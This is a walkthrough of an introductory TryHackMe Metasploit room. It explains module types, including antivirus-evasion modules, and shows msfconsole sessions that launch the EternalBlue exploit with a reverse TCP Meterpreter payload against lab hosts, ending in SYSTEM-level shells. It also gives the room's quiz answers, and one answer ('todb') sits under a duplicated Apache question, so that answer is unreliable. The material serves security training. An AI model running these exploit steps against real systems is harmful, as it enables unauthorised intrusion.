---
title: "Metasploit: Introduction"
date: 2025-07-26
categories: [TryHackMe]
tags: [info, metasploit]
excerpt: "Metasploit: Introduction Room TryHackMe"
---

## Introduction

This post will provide a solid foundation for using Metasploit Framework, covering how to find and use exploits, using the `Metasploit: Introduction` TryHackMe Room.

### Task 1: Introduction to Metasploit

**Metasploit** is a powerful and widely used exploitation framework for penetration testing. 
It comes in two versions: 
- Metasploit Pro, a commercial version with a GUI.
- Metasploit Framework, an open-source, command-line version. 

The Metasploit Framework is a collection of tools for various stages of a penetration test, including information gathering, scanning, exploitation, and post-exploitation. Its main components are `msfconsole`, the command-line interface, various modules (exploits, payloads, etc.), and standalone tools like msfvenom. 

No answer needed
> **Answer:** `No answer needed`


### Task 2: Main Components of Metasploit

#### Core Concepts

- **Vulnerability**: Design, coding, or logic flaws in target systems.
- **Exploit**: Code that leverages vulnerabilities to gain access.
- **Payload**: Code that executes on the target system after successful exploitation.

#### Module Categories
1. Auxiliary

Supporting modules including scanners, crawlers, and fuzzers for reconnaissance and information gathering.

```bash
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 auxiliary/
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit

20 directories, 2 files
```
{: file="Auxiliary Module Directory Structure"}

The auxiliary modules contain 20 different categories of supporting tools, including scanners for network reconnaissance, gather modules for information collection, and specialized modules for various protocols and file formats.



2. Encoders
Transform exploits and payloads to potentially evade signature-based antivirus detection.


```bash
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 encoders/
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86

10 directories, 0 files
```
{: file="Encoder Module Directory Structure"}

Encoders are organized by target architecture and platform, providing obfuscation capabilities for different processor types and scripting languages to help bypass signature-based detection systems.

3. Evasion
Advanced modules specifically designed to bypass modern security solutions and antivirus software.

```bash
/opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msbuild.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_hta.rb

1 directory, 9 files
```
{: file="Evasion Module Directory Structure"}
Currently focused on Windows environments, evasion modules include sophisticated techniques like AppLocker bypasses, process herpaderping, and Windows Defender evasion methods.

4. Exploits
Attack modules organized by target operating systems (Windows, Linux, Android, etc.) that leverage specific vulnerabilities.

```bash
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows

20 directories, 4 files
```
{: file="Exploit Module Directory Structure"}
The exploit modules span 20 different operating systems and platforms, from modern systems like Android and iOS to legacy mainframe systems, providing comprehensive coverage for various target environments.


5. NOPs (No Operation)
Buffer padding modules that perform no operations, used to achieve consistent payload sizes.

```bash
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86

10 directories, 0 files
```
{: file="NOP Module Directory Structure"}
NOP modules are organized by processor architecture, providing no-operation instructions specific to each platform to maintain payload stability and consistency across different target systems.


6. Payloads

The actual code executed on compromised systems, categorized into four main types.
```bash
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages

4 directories, 0 files
```
{: file="Payload Module Directory Structure"}
Payloads are organized into four categories:

- Singles: Self-contained payloads that run independently.
- Stagers: Establish communication channels for multi-stage attacks.
- Stages: Secondary payloads downloaded by stagers.
- Adapters: Wrappers that convert payloads into different formats.

7. Post
Post-exploitation modules for maintaining access, privilege escalation, and data extraction after initial compromise.

```bash
/opt/metasploit-framework/embedded/framework/modules# tree -L 1 post/
/post 
├── aix
├── android  
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows

12 directories, 0 files
```
{: file="Post-Exploitation Module Directory Structure"}

The post-exploitation modules are organized into 12 platform-specific directories, enabling targeted actions after successful system compromise. The "multi" directory contains cross-platform modules, while "networking" and "hardware" provide specialized capabilities for infrastructure-level post-exploitation activities.


What is the name of the code taking advantage of a flaw on the target system?
> **Answer:** `Exploit` <br>

What is the name of the code that runs on the target system to achieve the attacker's goal?
> **Answer:** `Payload` <br>

What are self-contained payloads called?
> **Answer:** `Singles` <br>

Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?
> **Answer:** `Singles` <br>

## Task 3: Msfconsole

### Launching Metasploit Console
The Metasploit console is launched using the msfconsole command, which provides the primary interface for interacting with all framework modules.

```bash
bashroot@ip-10-10-220-191:~# msfconsole 
                                                  
                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/

       =[ metasploit v6.0                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf6 >
```
{: file="Metasploit Console Startup"}

The console displays version information and module counts, then presents the msf6 > prompt for command input.

### Basic Console Features
**Linux Command Support**
The msfconsole supports most standard Linux commands directly within the interface:
```bash
bashmsf6 > ls
[*] exec: ls

burpsuite_community_linux_v2021_8_1.sh	Instructions  Scripts
Desktop					Pictures      thinclient_drives
Downloads				Postman       Tools

msf6 > ping -c 1 8.8.8.8
[*] exec: ping -c 1 8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=1.33 ms
```
{: file="Linux Commands in Msfconsole"}

Note that output redirection is not supported within the console environment.

**Help System**

The help command provides assistance for specific commands or general usage:
```bash
bashmsf6 > help set
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.
```
{: file="Help Command Output"}

**Command History**

Track previously executed commands using the history command:
```bash
bashmsf6 > history
1  use exploit/multi/http/nostromo_code_exec
2  set lhost 10.10.16.17
3  set rport 80
4  options
5  set rhosts 10.10.29.187
```
{: file="Command History Display"}

**Context-Based Operation**
 1. Module Context
Metasploit operates using contexts - when you select a module, the prompt changes to reflect your current working context:
```bash
bashmsf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
{: file="Module Context Selection"}

2. Viewing Options
Use show options to display configurable parameters for the current module:
```bash
bashmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use
   SMBPass                         no        (Optional) The password for the username
   SMBUser                         no        (Optional) The username to authenticate as

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique
   LHOST     10.10.220.191    yes       The listen address
   LPORT     4444             yes       The listen port
```
{: file="Module Options Display"}

3. Compatible Payloads
View available payloads for the current exploit using show payloads:
```bash
bashmsf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

   #   Name                                        Rank    Description
   -   ----                                        ----    -----------
   0   generic/custom                              manual  Custom Payload
   1   generic/shell_bind_tcp                      manual  Generic Command Shell, Bind TCP
   2   generic/shell_reverse_tcp                   manual  Generic Command Shell, Reverse TCP
   3   windows/x64/exec                           manual  Windows x64 Execute Command
   4   windows/x64/meterpreter/bind_ipv6_tcp      manual  Windows Meterpreter, IPv6 Bind TCP
   ```
{: file="Available Payloads List"}

4. Module Information
Get detailed information about any module using the info command:
```bash
bashmsf6 exploit(windows/smb/ms17_010_eternalblue) > info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
 Privileged: Yes
       Rank: Average
  Disclosed: 2017-03-14

Description:
  This module is a port of the Equation Group ETERNALBLUE exploit, 
  part of the FuzzBunch toolkit released by Shadow Brokers.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://cvedetails.com/cve/CVE-2017-0143/
  ```
{: file="Module Information Display"}


### Search Functionality

1. Basic Search
The search command is essential for finding relevant modules:
```bash
bashmsf6 > search ms17-010

Matching Modules
================

   #  Name                                      Rank     Description
   -  ----                                      ----     -----------
   0  auxiliary/admin/smb/ms17_010_command      normal   MS17-010 EternalRomance SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010        normal   MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       normal   MS17-010 EternalRomance SMB Remote Windows Code Execution
   ```
{: file="Search Results Display"}

2. Filtered Search
Use keywords to filter search results by type, platform, or other criteria:
```bash
bashmsf6 > search type:auxiliary telnet

Matching Modules
================

   #   Name                                                Rank    Description
   -   ----                                                ----    -----------
   0   auxiliary/admin/http/dlink_dir_300_600_exec_noauth  normal  D-Link DIR-600 Unauthenticated Remote Command Execution
   1   auxiliary/scanner/telnet/brocade_enable_login       normal  Brocade Enable Login Check Scanner
   2   auxiliary/scanner/telnet/telnet_login               normal  Telnet Login Check Scanner
   3   auxiliary/scanner/telnet/telnet_version             normal  Telnet Service Banner Detection
```
{: file="Filtered Search Results"}


### Exploit Ranking System
Exploits are ranked based on reliability:

| Ranking | Description |
| :--- | :--- |
| **Excellent** | Exploit will never crash the service |
| **Great** | Exploit has a default target and it is the "common case" |
| **Good** | Exploit has a default target and it is the "common case" for a specific environment |
| **Normal** | Exploit is otherwise reliable, but depends on a specific version |
| **Average** | Exploit is generally unreliable or difficult to exploit |
| **Low** | Exploit is nearly impossible to exploit |
| **Manual** | Exploit is unstable or difficult to exploit and is basically a DoS |

The exploit rankings are guidelines - lower-ranked exploits may work perfectly while higher-ranked ones might fail or crash target systems.

Source: [Exploit-Ranking](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)



How would you search for a module related to Apache?
> **Answer:** `search apache` <br>

How would you search for a module related to Apache?
> **Answer:** `todb` <br>

## Task 4: Working with modules


### Understanding Metasploit Prompts

Metasploit uses different command prompts to indicate your current context:

| Prompt | Context | Description |
|--------|---------|-------------|
| `root@ip-10-10-XX-XX:~#` | Regular shell | Standard Linux command prompt |
| `msf6 >` | Metasploit console | Main msfconsole interface |
| `msf6 exploit(module_name) >` | Module context | Working within a specific module |
| `meterpreter >` | Meterpreter session | Interactive session with target |
| `C:\Windows\system32>` | Target shell | Command shell on compromised system |

### Setting Module Parameters

All parameters use the same syntax: `set PARAMETER_NAME VALUE`

#### Common Parameters

- **RHOSTS**: Target system IP address(es) - supports single IPs, CIDR notation, ranges, or file lists
- **RPORT**: Target port where the vulnerable service is running
- **PAYLOAD**: The payload to use with the exploit
- **LHOST**: Your attacking machine's IP address
- **LPORT**: Local port for reverse connections
- **SESSION**: Session ID for post-exploitation modules

#### Parameter Management

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.165.39     yes       The target host(s), range CIDR identifier
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use
```
{: file="Setting Module Parameters"}

#### Global Variables

Use `setg` to set parameters globally across all modules:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):
   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   RHOSTS       10.10.165.39     yes       The target host(s), range CIDR identifier
```
{: file="Global Parameter Setting"}

#### Parameter Commands

- `set PARAM VALUE` - Set parameter for current module
- `setg PARAM VALUE` - Set parameter globally
- `unset PARAM` - Clear specific parameter
- `unset all` - Clear all parameters
- `unsetg PARAM` - Clear global parameter

### Running Modules

#### Execution Commands

- `exploit` or `run` - Execute the module
- `exploit -z` - Execute and background the session immediately
- `check` - Test if target is vulnerable (when supported)

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

[*] Started reverse TCP handler on 10.10.44.70:4444 
[+] 10.10.12.229:445 - Host is likely VULNERABLE to MS17-010!
[*] 10.10.12.229:445 - Connecting to target for exploitation.
[+] 10.10.12.229:445 - Connection established for exploitation.
[*] Sending stage (201283 bytes) to 10.10.12.229
[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186)
[*] Session 2 created in the background.
```
{: file="Exploit Execution Output"}

### Session Management

#### Working with Sessions

Once an exploit succeeds, it creates a session - the communication channel between your system and the target.

```bash
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186
```
{: file="Active Sessions List"}

#### Session Commands

- `sessions` - List all active sessions
- `sessions -i [ID]` - Interact with specific session
- `background` or `Ctrl+Z` - Background current session
- `sessions -k [ID]` - Kill specific session

```bash
msf6 > sessions -i 2
[*] Starting interaction with 2...

meterpreter > background
[*] Backgrounding session 2...
msf6 >
```
{: file="Session Interaction"}

Sessions remain active until terminated, allowing you to switch between multiple compromised systems and return to previous connections as needed.


How would you set the LPORT value to 6666?
> **Answer:** `set LPORT 6666` <br>


How would you set the global value for RHOSTS  to 10.10.19.23 ?
> **Answer:** `setg RHOSTS 10.10.19.23` <br>


What command would you use to clear a set payload?
> **Answer:** `unset PAYLOAD` <br>


What command do you use to proceed with the exploitation phase?
> **Answer:** `exploit` <br>

## Task 5: Summary

No answer needed.
> **Answer:** `No answer needed` <br>